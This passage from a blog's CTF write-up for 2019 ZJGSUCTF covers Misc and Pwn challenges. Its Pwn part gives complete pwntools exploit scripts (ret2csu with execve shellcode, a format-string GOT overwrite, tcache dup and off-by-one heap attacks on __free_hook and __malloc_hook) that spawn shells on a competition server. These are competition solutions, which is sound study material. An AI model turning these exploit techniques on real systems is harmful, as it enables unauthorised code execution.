MovePacman(<span class="number">1000000L</span>L);</span><br><span class="line">    DrawWindow();</span><br><span class="line">    CheckCollision();</span><br><span class="line">    MoveGhosts();</span><br><span class="line">    DrawWindow();</span><br><span class="line">    CheckCollision();</span><br><span class="line">    <span class="keyword">if</span> ( Points &gt; FreeLife )</span><br><span class="line">    &#123;</span><br><span class="line">      ++Lives;</span><br><span class="line">      FreeLife *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Delay();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( Food &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">if</span> ( Points &gt; <span class="number">333</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    mytmp = 'f21&#123;USJZ';</span><br><span class="line">    qword_205EA8 = 'c5ec16fb';</span><br><span class="line">    qword_205EB0 = '&#125;c55fbc9';</span><br><span class="line">    byte_205EB8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">5</span>; i &lt;= <span class="number">22</span>; ++i )</span><br><span class="line">      --*((_BYTE *)&amp;mytmp + i);</span><br><span class="line">    pat = (<span class="keyword">char</span> *)&amp;mytmp;</span><br><span class="line">  &#125;</span><br><span class="line">  DrawWindow();</span><br><span class="line">  <span class="keyword">return</span> usleep(<span class="number">0xF4240</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="AlphaStop"><a href="#AlphaStop" class="headerlink" title="AlphaStop"></a>AlphaStop</h2><p>模仿棋，破解的方法：</p>
<p><img src="/pics/2019-ZJGSUCTF/AlphaStop.png" alt="破解模仿棋"></p>
<p>Solve：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">p = remote(<span class="string">'10.21.13.190'</span>, <span class="number">2604</span>)</span><br><span class="line">ins = [<span class="string">'J11'</span>, <span class="string">'I11'</span>, <span class="string">'I10'</span>, <span class="string">'I9'</span>, <span class="string">'J8'</span>, <span class="string">'K8'</span>, <span class="string">'L9'</span>, <span class="string">'L10'</span>, <span class="string">'L11'</span>, <span class="string">'K12'</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> ins:</span><br><span class="line">    p.sendline(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>, <span class="number">20</span>):</span><br><span class="line">        x = chr(ord(<span class="string">'A'</span>) - <span class="number">1</span> + j)</span><br><span class="line">        x = x + str(i)</span><br><span class="line">        p.sendline(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    p.sendline(<span class="string">'L'</span> + str(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>, <span class="number">20</span>):</span><br><span class="line">    p.sendline(<span class="string">'L'</span> + str(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    p.sendline(<span class="string">'K'</span> + str(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>, <span class="number">20</span>):</span><br><span class="line">    p.sendline(<span class="string">'K'</span> + str(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    p.sendline(<span class="string">'J'</span> + str(i))</span><br><span class="line">p.sendline(<span class="string">'K9'</span>)</span><br><span class="line">p.sendline(<span class="string">'K10'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Blue-Whale"><a href="#Blue-Whale" class="headerlink" title="Blue_Whale"></a>Blue_Whale</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull n132/blue_whale:Blue_Whale</span><br><span class="line">Blue_Whale: Pulling from n132/blue_whale</span><br><span class="line">7e6591854262: Pull complete</span><br><span class="line">089d60cb4e0a: Pull complete</span><br><span class="line">9c461696bc09: Pull complete</span><br><span class="line">45085432511a: Pull complete</span><br><span class="line">8aa06b945196: Pull complete</span><br><span class="line">Digest: sha256:8087896e15320744a841504f98936c90d29fbdb590a4940fdd0708a053570cab</span><br><span class="line">Status: Downloaded newer image for n132/blue_whale:Blue_Whale</span><br><span class="line">$ docker run -it n132/blue_whale:Blue_Whale /bin/bash</span><br><span class="line">root@46298885a759:/# find / -name &quot;fl4g&quot;</span><br><span class="line">/lib/x86_64-linux-gnu/fl4g</span><br><span class="line">root@46298885a759:/# cat /lib/x86_64-linux-gnu/fl4g</span><br><span class="line">ZJGSUCTF&#123;0fbaed8d210a7a0480220a5c803d8435&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Mos"><a href="#Mos" class="headerlink" title="Mos"></a>Mos</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ed82d9634ea6:~/tmp# checksec ./main</span><br><span class="line">[*] &apos;/root/tmp/main&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">root@ed82d9634ea6:~/tmp# ./main</span><br><span class="line">123</span><br><span class="line">Magic Adress ===&gt;&gt;&gt;0x7ffd7ac7ab60</span><br></pre></td></tr></table></figure>
<p>障眼法。。。最近好久题目做太少了完全没想到 shellcode，明明是一道送分题，心累。Exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'sp'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./main'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'10.21.13.190'</span>, <span class="number">2600</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">main = <span class="number">0x400566</span></span><br><span class="line">csu_end_addr = <span class="number">0x40060a</span></span><br><span class="line">csu_front_addr = <span class="number">0x4005f0</span></span><br><span class="line">buf = <span class="number">0x00601000</span> + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">24</span></span><br><span class="line">payload = <span class="string">'A'</span> * offset + p64(csu_end_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0x400</span>) + p64(buf) + p64(<span class="number">0</span>) + p64(csu_front_addr) + <span class="string">'\x00'</span> * <span class="number">56</span> + p64(buf)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov rax, 59</span></span><br><span class="line"><span class="string">	mov rsi, 0</span></span><br><span class="line"><span class="string">	mov rdx, 0</span></span><br><span class="line"><span class="string">	mov rdi, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">	push rdi</span></span><br><span class="line"><span class="string">	mov rdi, rsp</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><p>比较明显的<code>fmtstr</code>，一开始想到的是把<code>system</code>的参数改成<code>/bin/sh</code>，后来发现字符串存在<code>.rodata</code>段，是只可读的。正确的思路是利用<code>one_gadget</code>和<code>system</code>之间的比较近的原理，将<code>system</code>改成<code>one_gadget</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line">system_got = elf.got[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%8$hn'</span>.format(<span class="number">0x2216</span>).ljust(<span class="number">0x10</span>, <span class="string">'\x00'</span>) + p64(system_got)</span><br><span class="line">payload = payload[:<span class="number">-5</span>]</span><br><span class="line">p.sendafter(<span class="string">'.\n'</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>简单<code>tcache</code>，填满<code>tcache</code>后利用<code>unsorted bin</code>泄漏<code>libc</code>，然后用<code>tcache dup</code>把<code>__free_hook</code>改成<code>system</code>。Exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'sp'</span>, <span class="string">'-h'</span>]</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./note'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'10.21.13.190'</span>, <span class="number">2599</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">one_gadget = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'========\n\n'</span>)</span><br><span class="line">	p.sendline(str(c))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Note&gt;\n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="string">'B'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 6</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">offset = <span class="number">0x7f6d1974dca0</span><span class="number">-0x7f6d19362000</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - offset</span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">one_gadget = libc_base + one_gadget[<span class="number">2</span>]</span><br><span class="line">success(<span class="string">'one_gadget = '</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 6</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">add(p64(free_hook)) <span class="comment"># 8</span></span><br><span class="line">add(<span class="string">'A'</span>) <span class="comment"># 9</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">add(p64(system)) <span class="comment"># 10</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="string">'/bin/sh'</span>) <span class="comment"># 11</span></span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Three-body"><a href="#Three-body" class="headerlink" title="Three-body"></a>Three-body</h2><p><code>off_by_one</code>加<code>shrink</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'sp'</span>, <span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">one_gadget_offset = <span class="number">0xf02a4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;\n'</span>, str(c))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, c = <span class="string">'A'</span>)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	cmd(size)</span><br><span class="line">	p.sendafter(<span class="string">'&gt;\n'</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, c)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;'</span>, str(idx))</span><br><span class="line">	p.sendafter(<span class="string">'&gt;'</span>, c)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'A'</span> * <span class="number">0x18</span>) <span class="comment"># 1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x68</span>, p64(<span class="number">0x21</span>) * <span class="number">13</span>) <span class="comment"># 2</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.readline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - (<span class="number">0x7ffff7dd1b41</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">log.info(hex(libc_base))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x88</span>, <span class="string">'A'</span> * <span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x88</span> + <span class="string">'\x41'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">add(<span class="number">0x38</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">35</span>)) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">log.info(hex(one_gadget))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x28</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'\x00'</span> * <span class="number">19</span> + p64(one_gadget)) <span class="comment"># 1</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="entry-meta entry-footer">
      
      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/05/15/Tcache-Makes-Heap-Exploitation-Easy-Again/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Tcache Makes Heap Exploitation Easy Again
        
      </div>
    </a>
  
  
    <a href="/2019/05/01/2019-Starctf-blindpwn/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2019-Starctf-blindpwn</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#100-分的题目就不想名字了"><span class="nav-number">1.1.</span> <span class="nav-text">100 分的题目就不想名字了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我苦心锻炼了三年"><span class="nav-number">1.2.</span> <span class="nav-text">我苦心锻炼了三年</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">2.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Click"><span class="nav-number">2.1.</span> <span class="nav-text">Click</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Message-Digest"><span class="nav-number">2.2.</span> <span class="nav-text">Message-Digest</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POKPOK"><span class="nav-number">2.3.</span> <span class="nav-text">POKPOK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#COFFEE"><span class="nav-number">2.4.</span> <span class="nav-text">COFFEE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">3.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sign-in"><span class="nav-number">3.1.</span> <span class="nav-text">Sign_in</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Differ"><span class="nav-number">3.2.</span> <span class="nav-text">Differ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PACMAN"><span class="nav-number">3.3.</span> <span class="nav-text">PACMAN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AlphaStop"><span class="nav-number">3.4.</span> <span class="nav-text">AlphaStop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Blue-Whale"><span class="nav-number">3.5.</span> <span class="nav-text">Blue_Whale</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">4.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mos"><span class="nav-number">4.1.</span> <span class="nav-text">Mos</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Time"><span class="nav-number">4.2.</span> <span class="nav-text">Time</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Note"><span class="nav-number">4.3.</span> <span class="nav-text">Note</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Three-body"><span class="nav-number">4.4.</span> <span class="nav-text">Three-body</span></a></li></ol></li></ol>
    
    </div>
  </aside>
</section>
        
      </div>

    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    <footer id="footer" class="site-footer">
  

  <div class="clearfix container">
      <div class="site-info">
	      &copy; 2019 AssassinQ All Rights Reserved.
        
      </div>
      <div class="site-credit">
        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
      </div>
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");

    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";


    <!-- headerblur min height -->
    
      var headerblur = document.getElementById("header-blur");
      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
    
    
</script>
    
<div style="display: none;">
  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
</div>

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
